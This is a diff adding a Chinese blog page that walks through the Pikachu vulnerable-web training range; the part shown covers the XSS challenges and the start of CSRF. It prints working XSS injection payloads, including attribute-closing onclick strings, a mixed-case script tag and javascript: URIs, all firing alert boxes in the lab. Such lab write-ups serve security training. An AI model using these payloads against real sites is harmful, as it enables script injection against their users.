@@ -1,0 +1,1461 @@
+
+<!DOCTYPE html><html lang="zh-CN" data-theme="dark">
+
+<head>
+  <meta charset="utf-8">
+  <meta name="hexo-theme" content="https://github.com/xaoxuu/hexo-theme-stellar/tree/1.33.1" theme-name="Stellar" theme-version="1.33.1">
+  
+  
+  <meta name="generator" content="Hexo 7.3.0">
+  <meta http-equiv='x-dns-prefetch-control' content='on' />
+  
+  <meta name="renderer" content="webkit">
+  <meta name="force-rendering" content="webkit">
+  <meta http-equiv="X-UA-Compatible" content="IE=Edge,chrome=1">
+  <meta name="HandheldFriendly" content="True" >
+  <meta name="mobile-web-app-capable" content="yes">
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="theme-color" media="(prefers-color-scheme: dark)" content="#000">
+  <meta name="theme-color" content="#f9fafb">
+  <title>Pikachu 靶场通关笔记 - blog</title>
+
+  
+    <meta name="description" content="🐾 Pikachu 靶场通关笔记 📌 本文记录 Pikachu 靶场各类 Web 漏洞的实战练习过程，涵盖 XSS、CSRF、SQL注入、文件操作、越权、序列化、XXE、SSRF 等常见漏洞类型。 https:&#x2F;&#x2F;www.cnblogs.com&#x2F;wrold&#x2F;p&#x2F;19670125   📚 目录 一、XSS 跨站脚本攻击 1.1 反射型 XSS（DOM型） 1.2 DOM型 XSS-x 1.3">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Pikachu 靶场通关笔记">
+<meta property="og:url" content="https://wr0ld.github.io/posts/31fdd992/">
+<meta property="og:site_name" content="blog">
+<meta property="og:description" content="🐾 Pikachu 靶场通关笔记 📌 本文记录 Pikachu 靶场各类 Web 漏洞的实战练习过程，涵盖 XSS、CSRF、SQL注入、文件操作、越权、序列化、XXE、SSRF 等常见漏洞类型。 https:&#x2F;&#x2F;www.cnblogs.com&#x2F;wrold&#x2F;p&#x2F;19670125   📚 目录 一、XSS 跨站脚本攻击 1.1 反射型 XSS（DOM型） 1.2 DOM型 XSS-x 1.3">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://wr0ld.github.io/avatar.png">
+<meta property="article:published_time" content="2026-03-22T04:00:00.000Z">
+<meta property="article:modified_time" content="2026-03-23T12:16:27.403Z">
+<meta property="article:author" content="wr0ld">
+<meta property="article:tag" content="XSS">
+<meta property="article:tag" content="SQL注入">
+<meta property="article:tag" content="CSRF">
+<meta property="article:tag" content="靶场">
+<meta property="article:tag" content="Pikachu">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://wr0ld.github.io/avatar.png">
+  
+  
+  
+  <meta name="keywords" content="XSS,SQL注入,CSRF,靶场,Pikachu">
+
+  <!-- feed -->
+  
+
+  <link rel="stylesheet" href="/css/main.css?v=1.33.1">
+
+
+  
+
+  
+
+  <script type="application/ld+json">{"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"wr0ld","sameAs":[],"image":"/avatar.png"},"dateCreated":"2026-03-22T12:00:00+08:00","dateModified":"2026-03-23T20:16:27+08:00","datePublished":"2026-03-22T12:00:00+08:00","description":"","headline":"Pikachu 靶场通关笔记","mainEntityOfPage":{"@type":"WebPage","@id":"https://wr0ld.github.io/posts/31fdd992/"},"publisher":{"@type":"Organization","name":"wr0ld","sameAs":[],"image":"/avatar.png","logo":{"@type":"ImageObject","url":"/avatar.png"}},"url":"https://wr0ld.github.io/posts/31fdd992/","keywords":"XSS, SQL注入, CSRF, 靶场, Pikachu","thumbnailUrl":"/images/pikachu.png","image":1}</script>
+  
+</head>
+<body>
+
+<div class="l_body content" id="start" layout="post" type="tech" ><aside class="l_left"><div class="sidebg"></div><div class="leftbar-container">
+
+
+<header class="header"><div class="logo-wrap"><a class="avatar" href="/about/"><div class="bg" style="opacity:0;background-image:url(https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.12/avatar/round/rainbow64@3x.webp);"></div><img no-lazy class="avatar" src="/avatar.png" onerror="javascript:this.classList.add('error');this.src='https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.12/image/2659360.svg';"></a><a class="title" href="/"><div class="main">blog</div></a></div></header>
+
+<div class="nav-area">
+
+<nav class="menu dis-select"><a class="nav-item active" title="博客" href="/" style="color:#1BCDFC"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="currentColor" fill-rule="evenodd" d="M5.879 2.879C5 3.757 5 5.172 5 8v8c0 2.828 0 4.243.879 5.121C6.757 22 8.172 22 11 22h2c2.828 0 4.243 0 5.121-.879C19 20.243 19 18.828 19 16V8c0-2.828 0-4.243-.879-5.121C17.243 2 15.828 2 13 2h-2c-2.828 0-4.243 0-5.121.879M8.25 17a.75.75 0 0 1 .75-.75h3a.75.75 0 0 1 0 1.5H9a.75.75 0 0 1-.75-.75M9 12.25a.75.75 0 0 0 0 1.5h6a.75.75 0 0 0 0-1.5zM8.25 9A.75.75 0 0 1 9 8.25h6a.75.75 0 0 1 0 1.5H9A.75.75 0 0 1 8.25 9" clip-rule="evenodd"/><path fill="currentColor" d="M5.235 4.058C5 4.941 5 6.177 5 8v8c0 1.823 0 3.058.235 3.942L5 19.924c-.975-.096-1.631-.313-2.121-.803C2 18.243 2 16.828 2 14v-4c0-2.829 0-4.243.879-5.121c.49-.49 1.146-.707 2.121-.803zm13.53 15.884C19 19.058 19 17.822 19 16V8c0-1.823 0-3.059-.235-3.942l.235.018c.975.096 1.631.313 2.121.803C22 5.757 22 7.17 22 9.999v4c0 2.83 0 4.243-.879 5.122c-.49.49-1.146.707-2.121.803z" opacity=".5"/></svg></a><a class="nav-item" title="关于" href="/about/" style="color:#3DC550"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="currentColor" d="M12 12c2.21 0 4-1.79 4-4s-1.79-4-4-4s-4 1.79-4 4s1.79 4 4 4" opacity=".5"/><path fill="currentColor" fill-rule="evenodd" d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10s10-4.48 10-10S17.52 2 12 2zm-2 15l-5-5l1.41-1.41L10 14.17l7.59-7.59L19 8l-9 9z" clip-rule="evenodd"/></svg></a></nav>
+</div>
+<div class="widgets">
+<div class="search-wrapper" id="search-wrapper"><form class="search-form"><a class="search-button" onclick="document.getElementById(&quot;search-input&quot;).focus();"><svg t="1705074644177" viewBox="0 0 1025 1024" version="1.1" xmlns="http://www.w3.org/2000/svg" p-id="1560" width="200" height="200"><path d="M1008.839137 935.96571L792.364903 719.491476a56.783488 56.783488 0 0 0-80.152866 0 358.53545 358.53545 0 1 1 100.857314-335.166073 362.840335 362.840335 0 0 1-3.689902 170.145468 51.248635 51.248635 0 1 0 99.217358 26.444296 462.057693 462.057693 0 1 0-158.255785 242.303546l185.930047 185.725053a51.248635 51.248635 0 0 0 72.568068 0 51.248635 51.248635 0 0 0 0-72.978056z" p-id="1561"></path><path d="M616.479587 615.969233a50.428657 50.428657 0 0 0-61.498362-5.534852 174.655348 174.655348 0 0 1-177.525271 3.484907 49.403684 49.403684 0 0 0-58.833433 6.76482l-3.074918 2.869923a49.403684 49.403684 0 0 0 8.609771 78.10292 277.767601 277.767601 0 0 0 286.992355-5.739847 49.403684 49.403684 0 0 0 8.404776-76.667958z" p-id="1562"></path></svg></a><input type="text" class="search-input" id="search-input" placeholder="站内搜索"></form><div id="search-result"></div><div class="search-no-result">没有找到内容！</div></div>
+
+<widget class="widget-wrapper linklist"><div class="widget-header dis-select"><span class="name">文章分类</span></div><div class="widget-body fs14">
+<div class="linklist left" style="grid-template-columns:repeat(1,1fr);">
+<a class="link" title="工具魔改" href="/categories/工具魔改/"><div class="flex"><span>工具魔改</span></div></a>
+<a class="link" title="笔记" href="/categories/笔记/"><div class="flex"><span>笔记</span></div></a>
+<a class="link" title="靶场" href="/categories/靶场/"><div class="flex"><span>靶场</span></div></a>
+<a class="link" title="靶机渗透" href="/categories/靶机渗透/"><div class="flex"><span>靶机渗透</span></div></a>
+<a class="link" title="vulnhub-DC" href="/categories/vulnhub-DC/"><div class="flex"><span>vulnhub-DC</span></div></a>
+<a class="link" title="DVWA" href="/categories/DVWA/"><div class="flex"><span>DVWA</span></div></a></div></div></widget>
+
+<widget class="widget-wrapper recent post-list"><div class="widget-header dis-select"><span class="name">最近更新</span></div><div class="widget-body fs14"><a class="item title" href="/posts/58685328/"><span class="title">CTF 伪协议</span></a><a class="item title" href="/posts/31fdd992/"><span class="title">Pikachu 靶场通关笔记</span></a><a class="item title" href="/posts/a6c6e02f/"><span class="title">常见Linux权限提升笔记</span></a><a class="item title" href="/posts/f10adb67/"><span class="title">VulnHub DC-9 靶机渗透测试笔记</span></a><a class="item title" href="/posts/16177df0/"><span class="title">VulnHub DC-8 靶机渗透测试笔记</span></a><a class="item title" href="/posts/9bfd2b6a/"><span class="title">VulnHub DC-7 靶机渗透测试笔记</span></a><a class="item title" href="/posts/7ce08dfd/"><span class="title">VulnHub DC-6 靶机渗透测试笔记</span></a><a class="item title" href="/posts/8eb76005/"><span class="title">VulnHub DC-5 靶机渗透测试笔记</span></a><a class="item title" href="/posts/69aac692/"><span class="title">VulnHub DC-4 靶机渗透测试笔记</span></a><a class="item title" href="/posts/b169bdb4/"><span class="title">VulnHub DC-3 靶机渗透测试笔记</span></a></div></widget>
+</div>
+<footer class="footer dis-select"><div class="social-wrap"><a class="social" href="https://github.com/wr0ld" target="_blank" rel="external nofollow noopener noreferrer"><img src="https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.12/social/08a41b181ce68.svg"/></a><a class="social" onclick="switchTheme()"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 1024 1024"><path fill="currentColor" fill-rule="evenodd" d="M582.4 326.4c-140.8 0-256 115.2-256 256s115.2 256 256 256 256-115.2 256-256-115.2-256-256-256z m0 448c-70.4 0-131.2-36.8-164.8-92.8 12.8 3.2 27.2 4.8 40 4.8 121.6 0 219.2-99.2 219.2-219.2 0-17.6-1.6-35.2-6.4-52.8 60.8 32 102.4 96 102.4 169.6 1.6 104-84.8 190.4-190.4 190.4zM582.4 262.4c17.6 0 32-14.4 32-32v-128c0-17.6-14.4-32-32-32s-32 14.4-32 32v128c0 17.6 14.4 32 32 32zM262.4 582.4c0-17.6-14.4-32-32-32h-128c-17.6 0-32 14.4-32 32s14.4 32 32 32h128c17.6 0 32-14.4 32-32zM310.4 356.8c6.4 6.4 14.4 9.6 22.4 9.6 8 0 16-3.2 22.4-9.6 12.8-12.8 12.8-32 0-44.8l-91.2-91.2c-12.8-12.8-32-12.8-44.8 0-12.8 12.8-12.8 32 0 44.8l91.2 91.2zM944 220.8c-12.8-12.8-32-12.8-44.8 0l-91.2 91.2c-12.8 12.8-12.8 32 0 44.8 6.4 6.4 14.4 9.6 22.4 9.6 8 0 16-3.2 22.4-9.6l91.2-91.2c12.8-12.8 12.8-33.6 0-44.8zM310.4 808l-91.2 91.2c-12.8 12.8-12.8 32 0 44.8 6.4 6.4 14.4 9.6 22.4 9.6 8 0 16-3.2 22.4-9.6l91.2-91.2c12.8-12.8 12.8-32 0-44.8-11.2-11.2-32-11.2-44.8 0z"></path></svg></a></div></footer>
+</div></aside><div class="l_main" id="main">
+
+
+
+
+
+<div class="article banner top">
+  <div class="content">
+    <div class="top bread-nav footnote"><div class="left"><div class="flex-row" id="breadcrumb"><a class="cap breadcrumb" href="/">主页</a>
+<span class="sep"></span><a class="cap breadcrumb" href="/">文章</a><span class="sep"></span><a class="cap breadcrumb-link" href="/categories/%E9%9D%B6%E5%9C%BA/">靶场</a></div>
+<div class="flex-row" id="post-meta"><span class="text created">发布于：<time datetime="2026-03-22T04:00:00.000Z">2026-03-22</time></span><span class="sep updated"></span><span class="text updated">更新于：<time datetime="2026-03-23T12:16:27.403Z">2026-03-23</time></span></div></div></div>
+    
+    <div class="bottom only-title">
+      
+      <div class="text-area">
+        <h1 class="text title"><span>Pikachu 靶场通关笔记</span></h1>
+        
+      </div>
+    </div>
+    
+  </div>
+  </div><article class="md-text content"><h1 id="🐾-Pikachu-靶场通关笔记"><a href="#🐾-Pikachu-靶场通关笔记" class="headerlink" title="🐾 Pikachu 靶场通关笔记"></a>🐾 Pikachu 靶场通关笔记</h1><blockquote>
+<p>📌 本文记录 Pikachu 靶场各类 Web 漏洞的实战练习过程，涵盖 XSS、CSRF、SQL注入、文件操作、越权、序列化、XXE、SSRF 等常见漏洞类型。</p>
+<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/wrold/p/19670125">https://www.cnblogs.com/wrold/p/19670125</a></p>
+</blockquote>
+<hr>
+<h2 id="📚-目录"><a href="#📚-目录" class="headerlink" title="📚 目录"></a>📚 目录</h2><ul>
+<li><a href="#%E4%B8%80xss-%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC%E6%94%BB%E5%87%BB">一、XSS 跨站脚本攻击</a><ul>
+<li><a href="#11-%E5%8F%8D%E5%B0%84%E5%9E%8B-xssdom%E5%9E%8B">1.1 反射型 XSS（DOM型）</a></li>
+<li><a href="#12-dom%E5%9E%8B-xss-x">1.2 DOM型 XSS-x</a></li>
+<li><a href="#13-xss-%E7%9B%B2%E6%89%93">1.3 XSS 盲打</a></li>
+<li><a href="#14-xss-%E4%B9%8B%E8%BF%87%E6%BB%A4%E7%BB%95%E8%BF%87">1.4 XSS 之过滤绕过</a></li>
+<li><a href="#15-xss-%E4%B9%8B-htmlspecialchars">1.5 XSS 之 htmlspecialchars</a></li>
+<li><a href="#16-xss-%E4%B9%8B-href-%E8%BE%93%E5%87%BA">1.6 XSS 之 href 输出</a></li>
+<li><a href="#17-xss-%E4%B9%8B-js-%E8%BE%93%E5%87%BA">1.7 XSS 之 JS 输出</a></li>
+</ul>
+</li>
+<li><a href="#%E4%BA%8Ccsrf-%E8%B7%A8%E7%AB%99%E8%AF%B7%E6%B1%82%E4%BC%AA%E9%80%A0">二、CSRF 跨站请求伪造</a><ul>
+<li><a href="#21-csrfget">2.1 CSRF（GET）</a></li>
+<li><a href="#22-csrfpost">2.2 CSRF（POST）</a></li>
+<li><a href="#23-csrf-token">2.3 CSRF Token</a></li>
+</ul>
+</li>
+<li><a href="#%E4%B8%89sql-%E6%B3%A8%E5%85%A5">三、SQL 注入</a><ul>
+<li><a href="#31-%E6%95%B0%E5%AD%97%E5%9E%8B%E6%B3%A8%E5%85%A5">3.1 数字型注入</a></li>
+<li><a href="#32-%E5%AD%97%E7%AC%A6%E5%9E%8B%E6%B3%A8%E5%85%A5">3.2 字符型注入</a></li>
+<li><a href="#33-%E6%90%9C%E7%B4%A2%E5%9E%8B%E6%B3%A8%E5%85%A5">3.3 搜索型注入</a></li>
+<li><a href="#34-x-%E5%9E%8B%E6%B3%A8%E5%85%A5">3.4 X 型注入</a></li>
+<li><a href="#35-insert--update-%E6%B3%A8%E5%85%A5">3.5 INSERT &#x2F; UPDATE 注入</a></li>
+<li><a href="#36-delete-%E6%B3%A8%E5%85%A5">3.6 DELETE 注入</a></li>
+<li><a href="#37-http-%E5%A4%B4%E6%B3%A8%E5%85%A5">3.7 HTTP 头注入</a></li>
+<li><a href="#38-%E5%9F%BA%E4%BA%8E-boolean-%E7%9A%84%E7%9B%B2%E6%B3%A8">3.8 基于 Boolean 的盲注</a></li>
+<li><a href="#39-%E5%9F%BA%E4%BA%8E%E6%97%B6%E9%97%B4%E7%9A%84%E7%9B%B2%E6%B3%A8">3.9 基于时间的盲注</a></li>
+<li><a href="#310-%E5%AE%BD%E5%AD%97%E8%8A%82%E6%B3%A8%E5%85%A5wide-byte">3.10 宽字节注入（Wide Byte）</a></li>
+</ul>
+</li>
+<li><a href="#%E5%9B%9Brce-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C">四、RCE 远程代码执行</a><ul>
+<li><a href="#41-exec-ping">4.1 exec “ping”</a></li>
+<li><a href="#42-exec-eval">4.2 exec “eval”</a></li>
+</ul>
+</li>
+<li><a href="#%E4%BA%94%E6%96%87%E4%BB%B6%E6%93%8D%E4%BD%9C%E6%BC%8F%E6%B4%9E">五、文件操作漏洞</a><ul>
+<li><a href="#51-%E6%9C%AC%E5%9C%B0%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%ABlfi">5.1 本地文件包含（LFI）</a></li>
+<li><a href="#52-%E8%BF%9C%E7%A8%8B%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%ABrfi">5.2 远程文件包含（RFI）</a></li>
+<li><a href="#53-%E4%B8%8D%E5%AE%89%E5%85%A8%E7%9A%84%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD">5.3 不安全的文件下载</a></li>
+<li><a href="#54-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0--%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%A0%A1%E9%AA%8C%E7%BB%95%E8%BF%87">5.4 文件上传 — 客户端校验绕过</a></li>
+<li><a href="#55-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0--%E6%9C%8D%E5%8A%A1%E7%AB%AF%E6%A0%A1%E9%AA%8C%E7%BB%95%E8%BF%87">5.5 文件上传 — 服务端校验绕过</a></li>
+</ul>
+</li>
+<li><a href="#%E5%85%AD%E8%B6%8A%E6%9D%83%E6%BC%8F%E6%B4%9E">六、越权漏洞</a><ul>
+<li><a href="#61-%E6%B0%B4%E5%B9%B3%E8%B6%8A%E6%9D%83">6.1 水平越权</a></li>
+<li><a href="#62-%E5%9E%82%E7%9B%B4%E8%B6%8A%E6%9D%83">6.2 垂直越权</a></li>
+</ul>
+</li>
+<li><a href="#%E4%B8%83%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86">七、目录遍历</a></li>
+<li><a href="#%E5%85%AB%E6%95%8F%E6%84%9F%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2">八、敏感信息泄露</a></li>
+<li><a href="#%E4%B9%9Dphp-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E">九、PHP 反序列化漏洞</a></li>
+<li><a href="#%E5%8D%81xxe-%E6%BC%8F%E6%B4%9E">十、XXE 漏洞</a></li>
+<li><a href="#%E5%8D%81%E4%B8%80%E4%B8%8D%E5%AE%89%E5%85%A8%E7%9A%84-url-%E8%B7%B3%E8%BD%AC">十一、不安全的 URL 跳转</a></li>
+<li><a href="#%E5%8D%81%E4%BA%8Cssrf-%E6%9C%8D%E5%8A%A1%E7%AB%AF%E8%AF%B7%E6%B1%82%E4%BC%AA%E9%80%A0">十二、SSRF 服务端请求伪造</a><ul>
+<li><a href="#121-ssrfcurl">12.1 SSRF（curl）</a></li>
+<li><a href="#122-ssrffile_get_contents">12.2 SSRF（file_get_contents）</a></li>
+</ul>
+</li>
+</ul>
+<hr>
+<h2 id="一、XSS-跨站脚本攻击"><a href="#一、XSS-跨站脚本攻击" class="headerlink" title="一、XSS 跨站脚本攻击"></a>一、XSS 跨站脚本攻击</h2><blockquote>
+<p>🔥 XSS（Cross-Site Scripting）是指攻击者将恶意脚本注入到网页中，使其他用户在浏览时执行该脚本，从而窃取 Cookie、劫持会话等。</p>
+</blockquote>
+<hr>
+<h3 id="1-1-反射型-XSS（DOM型）"><a href="#1-1-反射型-XSS（DOM型）" class="headerlink" title="1.1 反射型 XSS（DOM型）"></a>1.1 反射型 XSS（DOM型）</h3><p><strong>🔍 思路：</strong> 随便输入内容并查看页面源代码，定位到按钮触发的 JS 函数。</p>
+<p><img src="https://cdn.jsdelivr.net/gh/Tjsdrj/BlogImage@main/img/image1.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/Tjsdrj/BlogImage@main/img/image2.png"></p>
+<p>找到按钮所绑定的函数后：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/Tjsdrj/BlogImage@main/img/image3.png"></p>
+<p>发现参数被拼接到 <code>&lt;a&gt;</code> 标签中，可以利用单引号闭合属性来注入事件。</p>
+<p><img src="https://cdn.jsdelivr.net/gh/Tjsdrj/BlogImage@main/img/image4.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/Tjsdrj/BlogImage@main/img/image5.png"></p>
+<blockquote>
+<p>⚠️ 注意：一定要使用<strong>英文单引号</strong>，中文单引号无效！</p>
+</blockquote>
+<p><strong>💣 Payload：</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27; onclick=eval(&quot;alert(&#x27;xss&#x27;);&quot;&gt;xss&lt;/a&gt;</span><br></pre></td></tr></table></figure>
+
+<p>只需构造闭合，再点击 “xss” 链接：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/Tjsdrj/BlogImage@main/img/image6.png"></p>
+<p>成功触发弹窗 🎉</p>
+<p><img src="https://cdn.jsdelivr.net/gh/Tjsdrj/BlogImage@main/img/image7.png"></p>
+<hr>
+<h3 id="1-2-DOM型-XSS-x"><a href="#1-2-DOM型-XSS-x" class="headerlink" title="1.2 DOM型 XSS-x"></a>1.2 DOM型 XSS-x</h3><p><strong>🔍 思路：</strong> 与上一题类似，Payload 相同，但本题还支持通过 URL 参数提交（需手动点击一下触发）。</p>
+<p><strong>💣 Payload（URL 提交）：</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?text=%27%20onclick=eval(&quot;alert(%27xss%27);&quot;&gt;xss&lt;/a&gt;#</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/Tjsdrj/BlogImage@main/img/image8.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/Tjsdrj/BlogImage@main/img/image9.png"></p>
+<hr>
+<h3 id="1-3-XSS-盲打"><a href="#1-3-XSS-盲打" class="headerlink" title="1.3 XSS 盲打"></a>1.3 XSS 盲打</h3><p><strong>📖 概念：</strong> 盲打就是注入后在当前页面看不到效果，但 Payload 会在后台管理员查看时触发。</p>
+<p><strong>🔍 步骤：</strong></p>
+<ol>
+<li>在前台随意输入内容提交（包含 XSS Payload）</li>
+</ol>
+<p><img src="https://cdn.jsdelivr.net/gh/Tjsdrj/BlogImage@main/img/image10.png"></p>
+<ol start="2">
+<li>登录后台查看留言</li>
+</ol>
+<p><img src="https://cdn.jsdelivr.net/gh/Tjsdrj/BlogImage@main/img/image11.png"></p>
+<ol start="3">
+<li>后台页面触发弹窗 💥</li>
+</ol>
+<p><img src="https://cdn.jsdelivr.net/gh/Tjsdrj/BlogImage@main/img/image12.png"></p>
+<ol start="4">
+<li>查看源代码，可以看到之前写入的 XSS 代码已被执行</li>
+</ol>
+<p><img src="https://cdn.jsdelivr.net/gh/Tjsdrj/BlogImage@main/img/image13.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/Tjsdrj/BlogImage@main/img/image14.png"></p>
+<hr>
+<h3 id="1-4-XSS-之过滤绕过"><a href="#1-4-XSS-之过滤绕过" class="headerlink" title="1.4 XSS 之过滤绕过"></a>1.4 XSS 之过滤绕过</h3><p><strong>📖 概念：</strong> 服务端对脚本标签进行了简单的关键字过滤，但过滤规则不完整，可通过大小写混用绕过。</p>
+<p><img src="https://cdn.jsdelivr.net/gh/Tjsdrj/BlogImage@main/img/image15.png"></p>
+<p><strong>💣 Payload（大小写混用绕过）：</strong></p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">sCript</span>&gt;</span>alert(1)<span class="tag">&lt;/<span class="name">sCript</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>成功执行 ✅</p>
+<p><img src="https://cdn.jsdelivr.net/gh/Tjsdrj/BlogImage@main/img/image16.png"></p>
+<hr>
+<h3 id="1-5-XSS-之-htmlspecialchars"><a href="#1-5-XSS-之-htmlspecialchars" class="headerlink" title="1.5 XSS 之 htmlspecialchars"></a>1.5 XSS 之 htmlspecialchars</h3><p><strong>📖 概念：</strong> <code>htmlspecialchars</code> 是 PHP 中常见的 XSS 防御函数，可将特殊字符转义为 HTML 实体。但它存在以下几种绕过场景：</p>
+<table>
+<thead>
+<tr>
+<th>场景</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>① 用在 <code>href</code> 属性里</td>
+<td><code>javascript:alert(1)</code> 不含特殊字符，不会被转义</td>
+</tr>
+<tr>
+<td>② 未加 <code>ENT_QUOTES</code> 参数</td>
+<td>单引号不会被转义，可用于闭合属性</td>
+</tr>
+<tr>
+<td>③ 输出在 JS 代码块中</td>
+<td>保护不完整，可通过字符串闭合绕过</td>
+</tr>
+</tbody></table>
+<p><strong>🔍 步骤：</strong> 输入代码没有反应，查看源代码发现输入被放入了 <code>&lt;a&gt;</code> 标签的属性中。</p>
+<p><img src="https://cdn.jsdelivr.net/gh/Tjsdrj/BlogImage@main/img/image17.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/Tjsdrj/BlogImage@main/img/image18.png"></p>
+<p>发现是 <code>&lt;a&gt;</code> 标签中的单引号闭合问题，构造绕过：</p>
+<p><strong>💣 Payload：</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27; onclick=alert(1111) &#x27;</span><br></pre></td></tr></table></figure>
+
+<p>成功触发 🎉</p>
+<p><img src="https://cdn.jsdelivr.net/gh/Tjsdrj/BlogImage@main/img/image19.png"></p>
+<hr>
+<h3 id="1-6-XSS-之-href-输出"><a href="#1-6-XSS-之-href-输出" class="headerlink" title="1.6 XSS 之 href 输出"></a>1.6 XSS 之 href 输出</h3><p><strong>🔍 思路：</strong> 查看源代码发现尖括号已被编码转义，无法直接插入标签。<br>可以使用不含尖括号的方案：</p>
+<p><strong>💣 Payload 一（属性事件注入）：</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27; onclick=alert(1111) &#x27;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/Tjsdrj/BlogImage@main/img/image20.png"></p>
+<p><strong>💣 Payload 二（javascript 伪协议）：</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">javascript:alert(1)</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/Tjsdrj/BlogImage@main/img/image21.png"></p>
+<p>两种方式均可成功执行 ✅</p>
+<hr>
+<h3 id="1-7-XSS-之-JS-输出"><a href="#1-7-XSS-之-JS-输出" class="headerlink" title="1.7 XSS 之 JS 输出"></a>1.7 XSS 之 JS 输出</h3><p><strong>📖 概念：</strong> 用户输入被直接拼接到 JS 代码块中，需要闭合 JS 字符串才能注入恶意代码。</p>
+<p>尝试直接插入 <code>&lt;script&gt;</code> 标签，发现 JS 语法被破坏，不能正常执行：</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">scirpt</span>&gt;</span>alert(&#x27;xss&#x27;)<span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>查看源代码后，构造闭合注入：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/Tjsdrj/BlogImage@main/img/image22.png"></p>
+<p><strong>💣 Payload 一（闭合字符串）：</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27;;alert(1)//</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/Tjsdrj/BlogImage@main/img/image23.png"></p>
+<p><strong>💣 Payload 二（标签闭合绕过）：</strong></p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="title function_">alert</span>(<span class="string">&#x27;xss&#x27;</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/Tjsdrj/BlogImage@main/img/image24.png"></p>
+<p>两种方式均可成功触发 ✅</p>
+<hr>
+<h2 id="二、CSRF-跨站请求伪造"><a href="#二、CSRF-跨站请求伪造" class="headerlink" title="二、CSRF 跨站请求伪造"></a>二、CSRF 跨站请求伪造</h2><blockquote>
+<p>🎭 CSRF（Cross-Site Request Forgery）是指攻击者诱使已登录用户访问恶意页面，在用户不知情的情况下以其身份发起请求，篡改数据。</p>
+</blockquote>
+<hr>
+<h3 id="2-1-CSRF（GET）"><a href="#2-1-CSRF（GET）" class="headerlink" title="2.1 CSRF（GET）"></a>2.1 CSRF（GET）</h3><p><strong>🔍 步骤：</strong></p>
+<ol>
+<li>登录一个普通用户账号</li>
+</ol>
+<p><img src="https://cdn.jsdelivr.net/gh/Tjsdrj/BlogImage@main/img/image25.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/Tjsdrj/BlogImage@main/img/image26.png"></p>
+<ol start="2">
+<li>尝试修改个人信息，用 Burp Suite 抓包观察请求</li>
+</ol>
+<p><img src="https://cdn.jsdelivr.net/gh/Tjsdrj/BlogImage@main/img/image27.png"></p>
+<ol start="3">
+<li>发现是 <strong>GET 方式</strong>发送的请求</li>
+</ol>
+<p><img src="https://cdn.jsdelivr.net/gh/Tjsdrj/BlogImage@main/img/image28.png"></p>
+<ol start="4">
+<li>在 Burp 中右键 → 生成 CSRF PoC</li>
+</ol>
